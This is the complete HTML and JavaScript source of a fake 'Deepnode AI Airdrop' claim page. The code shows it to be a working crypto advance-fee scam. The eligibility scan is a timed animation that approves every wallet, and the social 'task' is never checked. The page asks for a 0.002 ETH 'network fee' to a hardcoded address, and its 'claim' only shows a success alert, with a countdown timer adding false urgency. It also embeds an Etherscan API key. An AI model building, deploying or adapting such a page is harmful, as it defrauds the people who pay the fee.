<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Deepnode AI Airdrop</title>

<script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>

<!-- WalletConnect v2 -->
<script src="https://unpkg.com/@walletconnect/client@2.9.12/dist/umd/index.min.js"></script>
<script src="https://unpkg.com/@walletconnect/qrcode-modal@1.6.1/dist/umd/index.min.js"></script>

<style>
html,body{margin:0;padding:0;height:100%;font-family:-apple-system,BlinkMacSystemFont,Inter,Arial;color:#fff;background:linear-gradient(180deg,#05060f,#1a0b2e,#3b145f);}
.container{height:100%;display:flex;flex-direction:column;justify-content:center;align-items:center;text-align:center;padding:24px;}
.logo{width:110px;margin-bottom:20px}
h1{font-size:22px;margin-bottom:12px}
button{width:100%;max-width:340px;padding:16px;font-size:16px;border-radius:14px;border:1px solid rgba(255,255,255,.25);background:rgba(255,255,255,.08);color:#fff;cursor:pointer;margin-top:10px}
button:disabled{opacity:.5;cursor:not-allowed}
.status{margin-top:18px;font-size:14px;opacity:.85}
.footer{position:absolute;bottom:22px;font-size:12px;opacity:.6}

/* Modal styles */
.modal{position:fixed;inset:0;background:rgba(0,0,0,.75);display:none;align-items:center;justify-content:center;z-index:100;}
.box{background:#0e0f1f;padding:24px;border-radius:16px;width:90%;max-width:360px;text-align:center}
.loader-section{margin-bottom:20px}
.progress{height:8px;background:rgba(255,255,255,.15);border-radius:10px;overflow:hidden;margin-top:10px}
.bar{height:100%;width:0%;background:linear-gradient(90deg,#7f5cff,#c77dff)}
.addr{font-size:12px;word-break:break-all;margin-top:10px;opacity:.8}

/* Buttons */
.payBtn,.checkBtn,.claimBtn,.taskCompleteBtn,.walletConnectBtn{margin-top:12px;padding:12px 0;width:100%;border:none;border-radius:12px;background:linear-gradient(90deg,#7f5cff,#c77dff);color:#fff;font-weight:600;cursor:pointer;}
.payBtn:disabled,.checkBtn:disabled,.claimBtn:disabled,.taskCompleteBtn:disabled,.walletConnectBtn:disabled{opacity:.5;cursor:not-allowed}
.taskBtn{background:linear-gradient(90deg,#1DA1F2,#0d8ddb);margin-top:8px;}
</style>
</head>
<body>

<div class="container">
  <img src="deepnode-logo.png" class="logo">
  <h1>Connect wallet to claim Deepnode AI airdrop</h1>

  <button onclick="connectMetaMask()">Connect MetaMask (Mobile)</button>
  <button class="walletConnectBtn" onclick="connectWalletConnect()">Connect WalletConnect (Desktop)</button>

  <div class="status" id="status"></div>
  <div class="footer">Deepnode AI ‚Ä¢ Terms & Privacy</div>
</div>

<!-- Eligibility Modal -->
<div class="modal" id="eligibilityModal">
  <div class="box">
    <div id="modalText">Checking eligibility‚Ä¶</div>
    <div class="progress"><div class="bar" id="bar"></div></div>
    <div class="addr" id="addr"></div>
  </div>
</div>

<!-- Task + Payment Modal -->
<div class="modal" id="taskModal">
  <div class="box">
    <!-- Task section -->
    <div id="taskSection" style="margin-top:20px; text-align:center;">
      <p>üéØ Task: Follow us on X to unlock the airdrop!</p>
      <a href="https://x.com/deepnodeai?s=21" target="_blank">
        <button class="taskBtn">Follow @deepnodeai</button>
      </a>
      <button id="taskCompleteBtn" class="taskCompleteBtn" disabled>Task Completed</button>
    </div>
    <!-- Payment and claim buttons -->
    <button class="payBtn" id="payBtn" onclick="payFee()" disabled>Pay 0.002 ETH Network Fee</button>
    <button class="checkBtn" id="checkBtn" onclick="checkPayment()" disabled>Check Payment</button>
    <button class="claimBtn" id="claimBtn" onclick="claim()" disabled>Claim Airdrop</button>
    <div id="paymentStatus" style="margin-top:10px; font-size:13px; opacity:0.8;"></div>
  </div>
</div>

<script>
/* ================= CONFIG ================= */
const RECIPIENT = "0xd4Fd6F4e221710b9977109A04E3fBFfA2FD620cd";
const REQUIRED_ETH = "0.002";
const ETHERSCAN_KEY = "VDQVS25IXQDJ8HZ2J8B3KWC9R4HI48Y14T";
let currentAddress;
let provider, signer;

/* ================= TIMER ================= */
const timerEl = document.getElementById("status");
let endTime = localStorage.getItem("airdropEnd");
if(!endTime){
  endTime = Date.now() + 3*60*60*1000;
  localStorage.setItem("airdropEnd", endTime);
}
function updateTimer(){
  const diff = endTime - Date.now();
  if(diff <=0){ timerEl.innerText="Claim period ended"; return; }
  const h = Math.floor(diff/3600000);
  const m = Math.floor((diff%3600000)/60000);
  const s = Math.floor((diff%60000)/1000);
  timerEl.innerText=`Claim ends in ${h}h ${m}m ${s}s`;
}
setInterval(updateTimer,1000);
updateTimer();

/* ================= CONNECT METAMASK ================= */
async function connectMetaMask(){
  if(!window.ethereum){ alert("Open this page in MetaMask mobile browser"); return; }
  provider = new ethers.providers.Web3Provider(window.ethereum);
  await provider.send("eth_requestAccounts",[]);
  signer = provider.getSigner();
  currentAddress = await signer.getAddress();
  afterConnect();
}

/* ================= CONNECT WALLETCONNECT ================= */
async function connectWalletConnect(){
  const wc = new window.WalletConnect.default({
    projectId: "e703ffab6d65fd8ada1adc0bfb719136",
    relayUrl: "wss://relay.walletconnect.com",
    metadata:{
      name:"Deepnode AI Airdrop",
      description:"Claim your Deepnode AI airdrop",
      url:window.location.href,
      icons:["https://deepnodelive.github.io/deepnode-ai-airdrop/deepnode-logo.png"]
    }
  });

  if(!wc.connected){
    await wc.connect();
  }
  currentAddress = wc.accounts[0];
  afterConnect();
}

/* ================= AFTER CONNECT ================= */
function afterConnect(){
  if(localStorage.getItem("claimed_"+currentAddress)){
    timerEl.innerText = "This wallet has already claimed.";
    return;
  }
  timerEl.innerText = "Wallet connected: " + currentAddress.slice(0,6)+"..."+currentAddress.slice(-4);
  showEligibility();
}

/* ================= ELIGIBILITY LOADER ================= */
function showEligibility(){
  const modal = document.getElementById("eligibilityModal");
  const bar = document.getElementById("bar");
  const text = document.getElementById("modalText");
  const addrEl = document.getElementById("addr");

  modal.style.display="flex";
  bar.style.width="0%";
  text.innerText="Checking eligibility‚Ä¶";
  addrEl.innerText=currentAddress;

  let progress=0;
  const phases=["Scanning wallet activity‚Ä¶","Validating eligibility‚Ä¶","Allocating airdrop‚Ä¶"];
  let step=0;

  const interval=setInterval(()=>{
    progress+=25;
    bar.style.width=progress+"%";
    text.innerText=phases[Math.min(step,phases.length-1)];
    step++;
    if(progress>=100){
      clearInterval(interval);
      text.innerText="‚úÖ Eligible!";
      modal.style.display="none";
      showTaskModal();
    }
  },500);
}

/* ================= TASK MODAL ================= */
function showTaskModal(){
  const modal = document.getElementById("taskModal");
  modal.style.display="flex";

  const taskBtn = document.getElementById("taskCompleteBtn");
  const payBtn = document.getElementById("payBtn");
  const checkBtn = document.getElementById("checkBtn");

  taskBtn.disabled=false;

  taskBtn.addEventListener("click",()=>{
    payBtn.disabled=false;
    payBtn.style.opacity=1;
    checkBtn.disabled=false;
    taskBtn.disabled=true;
    taskBtn.innerText="‚úÖ Task Verified";
  });
}

/* ================= PAY FEE ================= */
function payFee(){
  const wei = ethers.utils.parseEther(REQUIRED_ETH).toString();
  window.location.href=`ethereum:${RECIPIENT}?value=${wei}`;
}

/* ================= CHECK PAYMENT ================= */
async function checkPayment(){
  const statusEl = document.getElementById("paymentStatus");
  statusEl.innerText = "Checking payment‚Ä¶";
  try{
    const res = await fetch(`https://api.etherscan.io/api?module=account&action=txlist&address=${currentAddress}&sort=desc&apikey=${ETHERSCAN_KEY}`);
    const data = await res.json();
    const txList = Array.isArray(data.result)?data.result:[];
    const paid = txList.some(tx=>tx.to?.toLowerCase()===RECIPIENT.toLowerCase() && ethers.utils.formatEther(tx.value)===REQUIRED_ETH);
    if(paid){
      statusEl.innerText="‚úÖ Payment confirmed";
      const claimBtn = document.getElementById("claimBtn");
      claimBtn.disabled=false;
      claimBtn.style.opacity=1;
    } else {
      statusEl.innerText="‚ö†Ô∏è Payment not found yet";
    }
  }catch{
    statusEl.innerText="‚ö†Ô∏è Unable to check payment";
  }
}

/* ================= CLAIM ================= */
function claim(){
  localStorage.setItem("claimed_"+currentAddress,true);
  alert("üéâ Airdrop successfully claimed!");
  location.reload();
}
</script>
</body>
</html>